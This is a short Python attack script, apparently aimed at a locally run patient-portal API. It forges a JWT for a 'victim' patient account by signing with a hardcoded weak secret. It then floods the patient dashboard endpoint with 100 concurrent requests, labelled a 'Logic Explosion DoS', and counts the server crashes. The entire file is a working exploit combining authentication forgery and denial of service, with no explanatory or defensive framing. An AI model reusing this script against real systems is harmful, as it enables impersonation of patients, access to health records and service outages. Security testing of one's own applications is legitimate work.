import httpx
import asyncio
import jwt
import time

API_BASE = "http://localhost:8000/api/v1"
WEAK_SECRET = "supersecretkeyforlocaldevelopmentonly"

async def flood_crash_tokens(client, count):
    payload = {"sub": "victim@example.com", "role": "patient", "exp": 9999999999}
    token = jwt.encode(payload, WEAK_SECRET, algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}
    
    tasks = []
    for _ in range(count):
        tasks.append(client.get(f"{API_BASE}/patient/dashboard", headers=headers))
    
    start = time.time()
    responses = await asyncio.gather(*tasks, return_exceptions=True)
    duration = time.time() - start
    
    errors = [r for r in responses if isinstance(r, Exception) or (not isinstance(r, Exception) and r.status_code == 500)]
    print(f"Sent {count} crash tokens in {duration:.2f}s")
    print(f"Total 500 Errors/Crashes: {len(errors)}")

async def main():
    async with httpx.AsyncClient(timeout=30.0) as client:
        print("Starting Logic Explosion DoS...")
        await flood_crash_tokens(client, 100)

if __name__ == "__main__":
    asyncio.run(main())
